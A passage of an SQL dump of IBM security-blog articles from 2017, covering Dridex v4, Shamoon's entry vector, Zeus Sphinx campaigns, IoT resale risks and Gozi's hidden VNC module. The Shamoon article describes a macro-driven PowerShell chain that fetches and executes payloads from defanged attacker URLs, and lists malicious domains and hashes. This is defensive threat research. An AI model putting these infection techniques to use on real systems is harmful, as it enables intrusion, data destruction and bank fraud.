in v3 variants, but it has changed and enhanced the encryption while still relying heavily on the RC4 cipher. The unique binary format in which Dridex keeps its target list configurations, such as the URLs of targeted banks, has also received a cryptographic upgrade to keep targeted entities in the dark as much as possible. Up until the recent v3 build, Dridex used a very specific, invisible persistence mechanism. This method was called invisible because it was not present at all as long as the infected endpoint was up and running. Only before a shutdown of the operating system, Dridex’s dynamic link library (DLL) would get written to disk, and a registry value (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) was created to execute the malicious DLL upon reboot. The method was completely abandoned in v4, and Dridex now uses a DLL-hijacking technique instead. An executable is copied from system32 into a different directory and Dridex’s DLL is placed in that same directory. The malicious DLL mimics a legitimate DLL that’s loaded by the executable. According to Windows file path priority, the malicious DLL gets loaded instead of the original one, which is located in system32. These setups are placed in system32 and %AppData% folders and executed by registry run keys and scheduled tasks. X-Force research noted that this method was already observed in some of the last v3 builds detected in the past few months, but v4 has fully adopted this robustness-over-stealth approach for its persistence mechanism. The Dridex malware project continues to evolve, and 2017 is likely to be another year of change for this Trojan. Over the long reign of Dridex v3, we have seen some significant changes implemented into the malware’s operations, such as  ,   and fraudulent M.O. changes. It is not surprising to see a new major version released from this gang’s developers. In this release, we noted that special attention was given to dodging antivirus (AV) products and hindering research by adopting a series of enhanced anti-research and anti-AV capabilities. The changes to Dridex’s code injection method are among the most significant enhancements in v4. They allow Dridex to propagate in the infected endpoint with minimal calls to marked API functions. The adoption of a new injection technique shortly after its discovery demonstrates Dridex’s efforts to keep up with the times and the evolution of security controls. Although they relied on a publicized method, Dridex’s developers created their own version of it, a choice that is consistent with their usual preference to write proprietary code schemes for Dridex, as they did for its binary configuration format, for example. In this research we analyzed Dridex sample MD5s 4599fca4b67c9c216c6dea42214fd1ce and 1e6c6123af04d972b61cd3cde5e0658e. Dridex is featured in an   collection, which is updated regularly. You can view the collection and contribute to it  . IBM Security has a great deal of information on Dridex v4 and its attack schemes and can help banks and other targeted organizations learn more about this high-risk threat. To help stop threats like Dridex, banks and service providers can use adaptive solutions to detect infections and   when malware evolves or enhances its focus on the organization’s locale. Fighting evolving threats such as Dridex attacks can be made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from malware intelligence that provides real-time insight into fraudster techniques and capabilities. Consumers wishing to protect themselves from malware infections on endpoints and mobile devices are invited to read our  .', '\'Advanced Threats\', \'Dridex\', \'Financial Malware\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\'', 'https://securityintelligence.com/dridexs-cold-war-enter-atombombing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (132, 'Can You Inoculate Your Organization Against Cybercrime?', 'Diana Kelley', '2017-2-20', 'In the natural world, new viral threats arise and existing viruses evolve to defeat our defenses. Just look at the flu — during the 2015 to 2016 flu season, people around the globe were fighting strains out of  . This year, everyone’s worried about new flu varieties from  . That’s why we get annual flu shots, to get immunity from the season’s new viruses. It’s equally important to inoculate your organization against cybercrime. As my former Burton Group colleague   demonstrated back when he was in graduate school, computer viruses have a lot in common with viruses in the natural world. Both human and cyber viruses hide and evolve to get past perimeter defenses and attack from within. As humans, we are pretty well-equipped to fight off viruses. We have an immune system that is adept at coordinating a network of powerful resources to fight viral invasions. We help our immune system by supporting it in different ways. For example, I find that if I get at least eight hours of sleep a night, work out regularly, eat lots of green vegetables and consume plenty of vitamin C, I’m much less likely to get sick. We also have annual flu shots to protect against new virus strains, but what about protecting against new or evolved computer malware? Unfortunately, the security programs in many organizations are nowhere near as coordinated as our human immune system. Although companies invest in support for their security programs, a lack of resources and the   can make it very hard to ensure that the corporate security system is getting a full eight hours of sleep and extra vitamins. \n Instead, the reality in many organizations is a set of disconnected security point solutions and perimeter products, typically provided by a host of vendors. Individual components don’t communicate with each other to fight cybercrime. The piecemeal nature of these systems makes them hard to monitor, and the expertise needed to manage them isn’t always available in-house. Faced with increasingly persistent and sophisticated cybercrime, organizations need security programs that act more like the human immune system. Applying the idea of an immune system to cybersecurity can help organizations more effectively combat increasingly complex cyberthreats. Malware evolves as criminals create new viruses and as technologies such as cloud, mobile devices, social media and the Internet of Things (IoT) provide new attack vectors.  is one example. CryptoLocker, which emerged in 2013, was quickly joined by CryptoWall, then ZeroLocker, CryptoWall 3.0, CTB-Locker and Locky, all pieces of malware that encrypt data, but with different signatures and profiles. Similarly, the  , which attacked Japanese banks in 2015, demonstrated this evolution through its “masterful” reconfiguration of leaked source codes. Just as some viruses mutate, Shifu was an amalgamation and mutation of previous malware including Shiz, Gozi, Zeus and Dridex. Much like a human virus, the Shifu malware used the parts of previous malcode that helped to successfully infect systems while shedding the features and functions that resulted in detection. After infecting Japanese banks, Shifu switched targets and focused on banks in the  To inoculate your organization from cybercrime, your security systems must work more like the human immune system. That means devices, sensors and systems communicate, interact and work together to monitor activity and detect invaders, prevent infection and respond with appropriate measures. Of course, this integrated system needs a “brain” to help manage and coordinate it. Security intelligence analytics sit at the core of a  . These analytics work with network monitoring capabilities, network protection capabilities and identity controls to parse through massive amounts of data and provide alerts when suspicious, potentially criminal activity is detected. The earlier IT professionals discover anomalous behavior, the better the chances they will be able to prevent data loss and fraud. Security analytics are only as good as the intelligence that feeds them. While critical data companies can learn a lot from their own net flow and log file data, that isn’t enough to prevent infection in the cloud- and mobile-dependent world. That’s why, just like the human body needs a flu shot to introduce new “intelligence” about evolving virus strains, a security system needs new intelligence to defend itself from the latest threats. The IT security community needs to find ways to work together and share information that will help all organizations become more immune to cybercrime. For example, the   has 14,000 members that contribute to an open, 700-TB database of threat intelligence. Members can use this information to help inoculate their own systems against evolving viruses and other malware. Coupling external threat intelligence with a system of connected security tools and services, companies can move toward the model of a cybersecurity immune system and inoculate themselves against new attacks by ingesting and using the latest threat intelligence.', '\'Healthcare\', \'IBM X-Force Exchange\', \'Immune System\', \'Security Intelligence\', \'Skills Gap\', \'Threat Intelligence\'', 'https://securityintelligence.com/can-you-inoculate-your-organization-against-cybercrime/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (133, 'An IoT Love Story: Always Apart, Never Disconnected', 'Charles Henderson', '2017-2-17', 'This is the true story of when my personal life and my security research world collided. It’s also a love story, but it’s not really that mushy. Let’s start with the love story. I used to have a great convertible car. It brought me joy to cruise around Austin, wind blowing through my thinning hair and The Black Keys on the radio. Then I had kids. I decided having a good roof over my kids’ heads is just as important in the car as it is in the house. I responsibly disclosed to my wife that I wasn’t happy about it, but I decided to be an adult and trade in my convertible. My lovely convertible went back to the dealership and I got a more kid-friendly model from the same manufacturer. I’m a security researcher, so I’m skeptical of everything by nature. Before I brought the car to the dealership I deleted all my personal information from the car, reset the phone book, removed all connected devices and reset the garage door opener. When I got to the dealership, they took several steps as well. They made sure that all the keys issued to the car were turned back over. I was happy to see that the dealership went through several of the same privacy precautions, like making sure my personal information was removed from the phone book. Luckily, my new car also had the same connected car management app for my mobile device. When I got home, I synced up my management app and I noticed that under the car inventory in the application, my old car was still listed. I didn’t think much of it — I figured there must be a process by which that car would be expired. Over time, I began to realize that the car wasn’t going to expire. Days went by, then weeks, months and, eventually, years. It was obvious that whomever had purchased my old car had not enrolled it in the mobile app. This is where my curiosity kicked in — were manufacturers only designing   for the first owner because that’s where their revenue comes from? The first owner drives the value of most products, and for IoT devices especially, there’s no expectation that the life of the product will extend beyond that owner. Setting my old car aside for a moment, I looked at other forms of internet-based technology and found it wasn’t limited to vehicles. David Bryan, who works in  , recently bought a used home automation hub. He’s a penetration tester and vulnerability researcher, so he too is more cynical about technology and security than the average consumer. The first thing David did with the hub was perform a factory reset. But when he went to set it up, he saw a device listed under the management screen that was not his. After performing another factory reset, he contacted customer support. The first thing they asked him was, “Well, have you performed a factory reset?” It turned out that in this case, the factory reset only cleared the settings on the device, but not the account that managed the device in the cloud. After two weeks of going back and forth, the support team removed that extra device from the approved devices and asked David if they should remove a second device that also had access to his hub. David couldn’t even see that second device in his management console. It’s scary to think that even if a user checks the management settings and determines that everything is secure, there still might be authorized devices invisible to them. User awareness about security risks associated with these types of devices is relatively low. An   revealed that consumers were least worried about protecting car navigation data (8 percent), home devices (10 percent) and connected cameras (16 percent), compared to 64 percent who cared about their mobile devices. Thinking back to the connected car, the dealership was very aware that it should collect the keys for that car. When I notified the manufacturer of my remote access after selling the car, its response was, “Well, that’s the same as keeping keys.” But keys don’t have geolocation built in. Actually, a mobile device is much more dangerous than a simple key. Fundamentally, this really isn’t a new problem. Transfer of ownership has caused complications before in the tech industry. Look at the early days of mobile phones, when people would trade up to a new device and leave personal data on the old one. They didn’t know to remove it and it caused some embarrassing situations. But through education and more prominently featured factory reset methods, the phone manufacturers and carriers standardized the way   are reset. IoT device manufacturers need to look to that example and establish a common definition of factory reset. They need to disclose to their customers what data remains in the cloud after that factory reset. Some industries are getting in front of these IoT security issues. The National Association of Realtors is not only testing smart home devices, but also looking at how to properly convey them as part of a home sale. Smart home devices can be tricky, because a smart light bulb is designed to look like a regular light bulb. Consumers feel better when products look and feel the same, but this also means a new homeowner might be living with dozens of smart devices they don’t control. We’re living in a strange time because we’re seeing IoT devices change ownership for the first time. We know these devices aren’t aware enough to know they’ve been sold — but the bigger problem is that many consumers don’t know they’ve purchased a product with IoT capabilities. For those of you old enough to remember the early days of seat belt notifications in cars, there were not only beeps and dings, but also a voice reminding you to buckle up. I can imagine a similar situation emerging soon in which a light switch alerts you when you haven’t logged into your control app in the last 10 days. There are definitely some creative ways to approach these issues. Obviously, my team and I have looked into   to see what’s broken, but we’re also aware that our talents are more geared toward breaking than building. The path to true IoT security will require open dialogue between manufacturers, resellers, security researchers and consumers. For now, IoT consumers should follow a few rules to keep themselves safe:', '\'Connected Devices\', \'Internet of Things (IoT)\', \'IoT Security\', \'Mobile\', \'Mobile Devices\', \'Mobile Security\', \'X-Force\'', 'https://securityintelligence.com/an-iot-love-story-always-apart-never-disconnected/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (134, 'The Full Shamoon: How the Devastating Malware Was Inserted Into Networks', 'Kevin Albano', '2017-2-15', 'Researchers from the IBM X-Force Incident Response and Intelligence Services (IRIS) team identified a missing link in the operations of a threat actor involved in   against Gulf state organizations. These attacks, which occurred in November 2016 and January 2017, reportedly affected thousands of computers across multiple government and civil organizations in   and elsewhere in  . Shamoon is designed to destroy computer hard drives by wiping the master boot record (MBR) and data irretrievably, unlike ransomware, which holds the data hostage for a fee. Through their recent investigations, our forensics analysts pinpointed the initial compromise vector and post-compromise operations that led to the deployment of the destructive Shamoon malware on targeted infrastructures. It’s worth mentioning that, according to  , the initial compromise took place weeks before the actual Shamoon deployment and activation were launched. Since Shamoon incidents feature the infiltration and escalation stages of targeted attacks, X-Force IRIS responders sought out the attackers’ entry point. Their findings pointed to what appears to be the initial point of compromise the attackers used: a document containing a malicious macro that, when approved to execute, enabled C2 communications to the attacker’s server and remote shell via PowerShell. The document was not the only one discovered in the recent attack waves. X-Force IRIS researchers had been tracking earlier activity associated with similar malicious, PowerShell-laden documents themed as resumes and human resources documents, some of which related to organizations in Saudi Arabia. This research identified several bouts of offensive activity that occurred in the past few months, which revealed similar operational methods in which the attackers served malicious documents and other malware executables from web servers to their targets to establish an initial foothold in the network. \n Although Shamoon was previously documented in research blogs, the specific   methods leading to the attacks have remained unclear in the reported cases. X-Force IRIS researchers studied Shamoon’s attack life cycle and observed its tactics at Saudi-based organizations and private sector companies. This research led them to believe that the actor using Shamoon in recent attacks relied heavily on weaponized documents built to leverage PowerShell to establish their initial network foothold and subsequent operations:  identified the below malicious document: Our researchers examined the domain that hosted the first malicious file, mol.com-ho[.]me. Per the domain’s WHOIS record, an anonymized registrant registered com-ho[.]me in October 2016 and used it to serve malicious documents with similar  . The following list of documents included: These files were most likely delivered via spear phishing emails to lure employees into unwittingly launching the malicious payload. A closer review of the file names revealed “IT Worx” and “MCI.” A search of the name IT Worx brings up a global software professional services organization headquartered in Egypt. MCI is Saudi Arabia’s Ministry of Commerce and Investment. It is possible these names were used in spear phishing emails because they would seem benign to Saudi-based employees and lure them to open the attachment. X-Force IRIS researchers further identified that the threat actor behind the malicious documents served many of them using a URL-shortening scheme in the following pattern: briefl[.]ink/{a-z0-9}[5]. The following figure is a visual example of what employees may have encountered when they opened the malicious Word files sent to them in preparation for a Shamoon attack: Passive DNS results on a communications domain associated with the Shamoon attack revealed related network infrastructure, identifying additional domains used by the threat actors. X-Force IRIS discovered that the threat actor was hosting at least one malicious executable on a server hosted on ntg-sa[.]com. This file duped targets into believing it was a Flash player installer that would drop a Windows batch to invoke PowerShell into the same C2 communications. Analysis of one of the threat actor’s documents found that if the macro executes, it launches two separate PowerShell Scripts. The first one executes a PowerShell script served from hxxp://139.59.46.154:3485/eiloShaegae1. The host is possibly related to attacks that served the  , a publicly available cross-platform remote access tool. The second script calls VirtualAlloc to create a buffer, uses memset to load Metasploit-related shellcode into that buffer and executes it through CreateThread. Metasploit is an open source framework popular as a tool for developing and executing exploit code against a remote target machine. The shellcode performs a DWORD XOR of 4 bytes at an offset from the beginning of the shellcode that changes the code to create a loop so the XOR continues 0x57 times. If this execution is successful, it creates a buffer using VirtualAlloc and calls InternetReadFile in a loop until all the file contents are retrieved from hxxp://45.76.128.165:4443/0w0O6. This is then returned as a string to PowerShell, which calls invoke-expression (iex) on it, indicating that the expected payload is PowerShell. Of note, the macro contained a DownloadFile() function that would use URLDownloadToFileA, but this was never actually used. Based on observations associated with the malicious document, we observed subsequent shell sessions probably associated with Metasploit’s   that enabled deployment of additional tools and malware preceding deployment of three Shamoon-related files: ntertmgr32.exe, ntertmgr64.exe and vdsk911.sys. Although the complete list of Shamoon’s victims is not public,   reported that in one case, thousands of computers were destroyed at the headquarters of Saudi’s General Authority of Civil Aviation, erasing critical data and bringing operations to a halt for several days. The recent activity X-Force IRIS is seeing from the Shamoon attackers has so far been detected in two waves, but those are likely to subside following the public attention the cases have garnered since late 2016. Saudi Arabia   to local organizations about the Shamoon malware, alerting about potential attacks and advising organizations to prepare. Analysis and warnings about Shamoon are resulting in preparation on the targets’ end, and actors are likely to disappear and change their tactics until the next wave of attacks.', '\'Advanced Malware\', \'IBM X-Force Research\', \'Malware\', \'Network Protection\', \'Network Security\', \'X-Force\'', 'https://securityintelligence.com/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (135, 'The Red Portal: IBM X-Force Red’s Collaborative Client Experience', 'Krissy Safi', '2017-2-10', 'is a group of security professionals and ethical hackers whose goal is to help businesses discover vulnerabilities in their computer networks, hardware and software applications before cybercriminals do. X-Force Red, part of IBM Security Services, also examines human security vulnerabilities in daily processes and procedures that attackers often use to circumvent security controls.   Today, IBM X-Force Red is announcing The Red Portal, a cloud-based collaboration platform for clients and security professionals that presents an end-to-end view of   programs. Clients can view real-time testing project milestones, vulnerabilities across all assets, reports of findings and the overall status of their managed testing program. \n The industry expertise of X-Force Red is central to successfully building and maintaining a top-notch security testing program, and the collaborative nature of The Red Portal makes it easier than ever for clients to be involved in the testing process. The Dashboard page provides a real-time view of the client’s overall  . They can see how many tests have been conducted and the total number of findings that have been identified, including the number of critical and high-risk items. Clients can also view how many tests are in each phase of the testing process and whether any are awaiting additional client input. Up-to-date test statuses are a simple login away, allowing clients to embed themselves in the testing process as little or as much as they want. The Red Portal centralizes and streamlines all communications with X-Force Red and eliminates the need to pass sensitive target information through insecure methods. All test requests are made via one simple, secure form, and required target information is also collected here. All target and finding information is encrypted. Clients can also define their desired testing start date with the built-in scheduling capability. Once the security test has begun, clients can view findings as the tester makes them available — meaning remediation can begin immediately on the most critical items. After the test is complete, an interactive final report is available from the dashboard. The final report contains all findings, including details about the vulnerabilities, evidence of exploitation and detailed guidance for remediation and prioritization.', '\'IBM\', \'IBM Security\', \'Penetration Testing\', \'RSA\', \'RSA Conference\', \'X-Force\'', 'https://securityintelligence.com/the-red-portal-ibm-x-force-reds-collaborative-client-experience/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (136, 'Overcoming the Security Side-Eye: Making Collaborative Threat Intelligence Work', 'Pamela Cobb', '2017-2-10', 'The facial expression has many names: side-eye, skepticism, disbelief — the perfect, singular, arched eyebrow over a pair of glasses. Regardless of the name, it is one we have seen both digitally, virtually and in person when discussing  .\n Yes, we can proclaim that the bad guys are working together and organized cybercrime is on the rise. We can talk about how it is imperative that security vendors, partners and clients work together to shorten the life cycle of threats. But how realistic is it to expect collaboration in such a tense threat landscape?\n When we talk about the types of information being shared, it’s important to clarify the content as well. The general guidance is to avoid sharing proprietary, internal information about your security infrastructure, such as the number of endpoints and servers, or even specific security appliances or software installed. Instead, security professionals should share  .\n Analysts should be encouraged, for example, to share the content of a spam email, the source IP and the MD5 hash associated with a potentially malicious attachment, but not necessarily the number of employees who received the email or clicked a link or attachment.\n It’s important to note the distinction between evidence of attempts and evidence of infiltration. A successful attack is far more dangerous and likely to spread elsewhere than an unsuccessful one. Sharing indicators of compromise (IoCs) on an active infiltration can help shorten the life cycle of a successful campaign and make more work for the attackers, since they must reconfigure their methods to overcome the defenses erected to block their incursion.\n Aside from fear of liability from  , corporate policies often prohibit sharing outside the organization. This is the hardest obstacle to overcome because it requires a change that starts with the corporate legal team and can have a ripple effect in other areas.\n The good news is that government and community-led efforts such as the U.S. Cybersecurity Information Sharing Act (CISA), and industry-focused groups like the Information Sharing and Analysis Centers (ISACs), are affecting change in these areas. The Hong Kong Monetary Authority recently   to further encourage high standards of cybersecurity within the Hong Kong financial markets. These policies and organizations aim to ease the way for businesses to join the threat information sharing movement.\n Let’s say you have permission to share threat intelligence and begin collaborating. Now what? Organizations often lack processes to anonymize and distribute threat intelligence back into the security community, as well as the resources to define the process. The challenge, then, is to research the plethora of collaborative threat intelligence platforms available and choose one that meets your organization’s needs, particular process and budget.\n Of course, vendor-sponsored platforms such as the   are one option, but many ISACs also have online communities. Attackers have figured out how to remotely collaborate via message boards, online black markets and even email, so time is of the essence in learning how to give yourself the same advantage.\n So now that you have permission to share and a place to share, how do you figure out with whom to share? Trust relationships are imperative. A good place to start is with a group of like-minded colleagues. Whether it be in person at conferences or vendor shows, online through an ISAC, on-platform with other users of a collaborative threat intelligence portal, or even through online communities such as LinkedIn, there is no shortage of security peers struggling with many of the same issues.\n Independent initiatives such as the  , a conglomeration of security solution vendors and researchers who joined forces to collectively share information and protect their customers, have also sprouted up to help provide options for security analysts seeking additional information and a trusted network.\n The obstacles are not insurmountable, but it does take time to cultivate the right structure and network of colleagues to collaborate on threat intelligence. To learn more about what to look for in a platform, join the Feb. 22 webinar, “ .”', '\'Collaboration\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'Threat Sharing\'', 'https://securityintelligence.com/overcoming-the-security-side-eye-making-collaborative-threat-intelligence-work/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (137, 'X-Force Red Launches in Latin America and Takes on the Evolution of Cybersecurity', 'Luiz Eduardo Dos Santos', '2017-2-7', 'It has been almost three months since I joined IBM with the mission of leading the   team in Latin America and heading up some of our special initiatives. For the past few years, I have worked closely with security professionals in Latin America to fight against targeted attacks in which cybercriminals do whatever it takes to gain and maintain access to a victim’s environment. This definitely gave me a different perspective about how to help organizations use proactive, advanced security services to boost their security programs. The truth is that most of the   are no different from those of other regions. There is no single reason why a given organization might fall victim to a cyberattack. Obviously, certain verticals are targeted more frequently than others. Payment card information, for example, is among the most valuable data for cybercriminals to steal. Yet this problem is not exclusive to the financial, retail or hospitality verticals. Security awareness in general has improved, although maybe not in the way security practitioners dream. Executives see news of high-profile data breaches and watch mainstream TV shows that demonstrate how easily attacks can be executed and, even worse, how fragile organizations can be. At first, this might not seem like a big deal, but it has actually sustained the work and efforts that security departments in organizations all over the globe have been fighting for. Most importantly, executives are beginning to understand the need to invest in cybersecurity for reasons beyond  . Suddenly, staying out of the evening news is a very good return on investment (ROI). No news is good news, then? Unfortunately, not necessarily. To protect against targeted attacks, security professionals must constantly ask themselves key questions: How long do attackers stay inside a given environment? To what extent should an organization negotiate with attackers to recover critical data? How effective can such a negotiation be? Executives should trust the information security department when it comes to investing in technologies focused on defending against cyberthreats at the perimeter. Organizations are also starting to improve in other areas, such as visibility, data protection, security policy and user education and training. But more work still has to be done. Business leaders must realize that a security incident will eventually occur. Someone inside the organization must believe in the boogeyman, understand the organization’s deficiencies and be ready to respond when attackers strike. Two complementary facets of information security services can help organizations achieve the next level: offensive security testing and  . From a distance, these efforts might look similar, but the truth is that they are substantially different in how they are delivered and how they help organizations prepare for attacks. X-Force Red helps organizations find and understand the security issues in their systems by providing offensive security tools that enable IT teams to hack nontechnical users, applications, networks, simple Internet of Things (IoT) devices, and complex hardware and systems integrations. Cybercriminals test your organization every day. The difference is you do not receive a report at the end of the test. It is not uncommon to hear that penetration testing and ethical hacking are commodities, but it doesn’t take long to learn who the serious players in this market are. IBM has a reputation for innovation, thousands of patents and cutting-edge cognitive computing offerings. Furthermore, X-Force Red’s offensive team is unmatched in terms of talent, quality, ethics and global reach of offensive security services.', '\'Advanced Threats\', \'IBM\', \'IBM Security\', \'Incident Response (IR)\', \'Penetration Testing\', \'X-Force\'', 'https://securityintelligence.com/x-force-red-launches-in-latin-america-and-takes-on-the-evolution-of-cybersecurity/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (138, 'Use Threat Intelligence to Improve Your Cyber Resilience', 'John Bruce', '2017-2-1', 'Today’s threats are more complex than ever: Adversaries are working together to become smarter — and it’s time we did too. Leveraging threat intelligence is a big part of becoming more aware. Insufficient risk awareness, analysis and assessment are some of the top barriers to cyber resilience, according to the Ponemon Institute study,  . While it’s easy to say, it’s not as easy to implement. Navigating countless feeds of varying quality and managing the signal-to-noise problem can be especially challenging. In our on-demand webinar with Dr. Larry Ponemon of the Ponemon Institue, “ ,” we discussed how security leaders could effectively leverage it to improve their cyber resilience using the following three approaches. One of our customers, a major media network, found their analysts spent way too much time investigating threat intelligence data — chasing issues that didn’t apply to them, which drained resources and seriously limited their effectiveness. To fix this, the team grounded that data into their existing incident response processes. Analysts escalate indicators of compromise (IoCs) into incidents, and they can access vital information about potential threats when needed — using the available intel when relevant to the circumstances they face. It’s made a big difference. By integrating threat intelligence with other data sources, such as security information and event management (SIEM) and endpoint detection and response (EDR) solutions, the information becomes more actionable for the analysts. They can refine and target the scope of the data by considering the context, severity and patterns. It gives them much more contextual awareness. This is better to understand what they’re contending with and what would be best to do about it. Many intel feeds are available, and none are one-size-fits-all. There’s open source, closed communities, commercial sources — and then there are threat intelligence platforms. Record how often individual feeds provide information: How critical is it? What quality is it? You’ll soon see if specific feeds are redundant or need to be adjusted. We outline a few real-world examples of these three approaches in our on-demand webinar, “ .” You can also download a complete copy of the latest Ponemon report,  .', '\'cyber resilience\', \'Incident Response (IR)\', \'Threat Intelligence\'', 'https://securityintelligence.com/use-threat-intelligence-to-improve-your-cyber-resilience/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (139, 'Health Care Data at Growing Risk From Ransomware, Insiders and Third-Party Breaches', 'Michelle Alvarez', '2017-1-31', 'According to the Ponemon Institute’s “ ,” a stolen health care record cost the average business $355 in 2016. That’s more than twice the mean cost of $158 across all industries. It’s safe to say, then, that this cost will continue to rise in the health care industry as the threat of ransomware rapidly increases. In a notable example from 2016, cybercriminals attempted to extort a hospital for  . The victimized organization ended up paying a smaller amount, but the incident showed that hospitals are popular targets for ransomware-wielding fraudsters. Insider threats, both malicious and inadvertent, also continue to plague health care organizations. According to   data, insiders were responsible for 68 percent of all network attacks targeting health care data in 2016. Almost two-thirds of those attacks originated from unwitting parties who may have fallen victim to phishing scams or misconfigured servers. Ransomware attacks and insiders aren’t the only threats to the health care sector. Risks can also materialize through indirect events such as third-party electronic health record (EHR) vendor breaches. In 2015, for example, a health care software company revealed that cybercriminals had stolen data belonging to almost  . The new IBM report on the MSS data revealed that 48 percent of attacks use malicious data input to control or disrupt a target system’s behavior. This represents the No. 1 attack vector threatening health care data. Despite being under constant pressure to lower the cost of health care to consumers, medical organizations simply cannot afford to risk multimillion dollar losses by shirking cybersecurity. That’s why   is just what the doctor ordered. Attacks against health care organizations will only multiply as the black market value of medical records packaged into full individual profiles continues to rise in 2017. Now, more than ever, organizations must address the urgent need to transform a point product-based set of security solutions into an integrated  . You can learn more by reading the IBM report “ .”', '\'Healthcare\', \'Healthcare Data Breach\', \'Healthcare Industry\', \'Healthcare Security\', \'Insider Threat\', \'Ransomware\', \'Third-Party Vendors\'', 'https://securityintelligence.com/ibm-report-finds-health-care-data-at-growing-risk-from-ransomware-insiders-and-third-party-breaches/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (140, 'Around the World With Zeus Sphinx: From Canada to Australia and Back', 'Limor Kessem', '2017-1-26', 'IBM X-Force researchers recently identified new infection campaigns delivering distinct   Trojan variants to online banking users in Canada and Australia. This is the first time our researchers have observed Sphinx campaigns with dedicated configurations targeting financial institutions in either of the two countries. We believe they are part of ongoing testing by Sphinx operators. Sphinx has been keeping low levels of activity since August 2016, when it was detected in  . The malware authors have been making small, incremental upgrades to the code. The recent configurations targeting online banking consumers in Canada and Australia are used sparingly in what looks like low-volume testing, not full-blown infection campaigns. The malware’s operators appear to be looking very carefully to determine which geographies offer the paths of least resistance. In Canada, Sphinx’s operators included URLs for over 33 financial institutes. They focused their target list on credit unions, likely seeing them as the lower hanging fruit in the Canadian financial sector. The malware’s targets are consumer accounts. \n The Canada-focused Sphinx operators are most likely familiar with the cybercrime arena. According to our research team, they used the same attack servers that facilitated the Zeus Citadel and Ramnit attacks in early 2016 and the fourth quarter of 2016, respectively. The webinjections share familiar code patterns with other banking Trojans, indicating that the attackers likely bought them from an  . In their recent campaigns, Sphinx’s operators have been using two distribution methods to spread the malware to new victims: email messages containing malicious Word documents that launch a visual basic for applications (VBA) loader and   designed to spread the  . The use of the Sundown EK provides further evidence that Sphinx’s operators may be linked to other commercial malware operators. Sundown has been evolving since the fourth quarter of 2016, from a relatively small, second-tier kit into one of the most prominent EKs in circulation. It includes older exploits for Internet Explorer, Flash and Silverlight. It has been previously connected with other banking Trojans such as Kronos and with previous malware campaigns in Canada. In Australia, the configuration targets a mix of 40 major banks, credit unions and payment providers. That configuration also targets some banks based in the U.S. \n IBM X-Force research reported past Sphinx campaigns launched against Brazilian banks in 2015 and   in 2016. From a global perspective, Sphinx is counted as part of the overall Zeus family of Trojans, since it is almost entirely based on the  . With multiple Zeus variations such as  , Sphinx and   active in the wild, Zeus’s codebase maintains the top position as the most active banking Trojan family. Different variants are operated by numerous cybercrime factions worldwide. \n IBM X-Force shares Zeus Sphinx indicators of compromise (IoCs) on  . Just type “Zeus Sphinx” into the search bar to find all related collections on this malware. Your team can anonymously add to Zeus Sphinx collections by sharing additional IoCs on X-Force Exchange. This ultimately helps information security professionals fight cybercrime threats in closer to real time, cutting malware’s lifelines. To share and follow Zeus Sphinx IoCs, check out the   on X-Force Exchange. Sample MD5 hashes are: Banks wishing to protect their customers from evolving threats and cybercrime modus operandi are invited to learn more about  . Individuals can reference our   for ways to protect themselves from malware such as Zeus Sphinx and other banking Trojans.', '\'Banking Trojan\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Sphinx\', \'Trojan\', \'X-Force\', \'Zeus\', \'Zeus Malware\', \'Zeus Sphinx\'', 'https://securityintelligence.com/around-the-world-with-zeus-sphinx-from-canada-to-australia-and-back/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (141, 'Anatomy of an hVNC Attack', 'Lior Keshet', '2017-1-25', 'Top-tier financial malware like  , Neverquest and Gozi offer a wide range of malicious capabilities, such as form-grabbing, screen capture, webinjections and more. One notable capability is the hidden virtual network computing (hVNC) module, which allows attackers to gain user-grade access to an infected PC. It’s no secret that banking Trojans contain remote control capabilities, but how exactly they operate them is not well-known. Hidden virtual network computing is a tactical means for malware to control a machine without the victim’s knowledge. To illustrate, we will use our detailed technical analysis of the Gozi Trojan’s hVNC module. To understand how hidden VNC works, let’s look at an abstract of the VNC model. A VNC connection is composed of two parts: a server and a client. In this case, the server is the victim’s computer and the client is the attacker. \n Over the VNC connection, the server sends the client screen captures that reflect the state of the controlled endpoint’s desktop. During that session, the client provides the controller’s keystrokes, mouse movements and mouse clicks. The victim’s endpoint performs the actions dictated by the attacker and the changes on the screen are reflected back to the attacker via the continuous stream of screen captures. This enables the actor to remotely control events on the infected device. In a regular VNC connection, the victim can see everything the attacker is doing. Obviously, that doesn’t suit fraudsters. Enter hidden VNC. VNC remote control is not inherently malicious. It is used in many scenarios as a legitimate remote support tool. Cybercriminals simply abuse the remote user-grade access VNC affords them. VNC is commonly added to financial malware to bypass fraud protections. In the past, fraudsters used proxies to fake their IP addresses. As protections improved, however, they had to devise ways to fake entire device fingerprints. That’s where VNC comes in. If a transaction originates from a known user device, it is more likely to succeed. To make fraudulent transactions appear legitimate to a victim’s bank, fraudsters previously had to access the account from the victim’s own machine without leaving a trace. If they were to use standard remote-control software, such as regular VNC, the user would see the cursor moving on its own and become suspicious. Cybercriminals devised hidden VNC to address this problem. Instead of controlling a victim’s desktop, an attacker can open a hidden instance in the shape of a virtual desktop and control it invisibly behind the scenes, even as the unwitting victim continues using his or her computer. To wipe away any trace of the endpoint having been controlled remotely, the hVNC creates a new  . This virtual desktop has its own corresponding explorer.exe 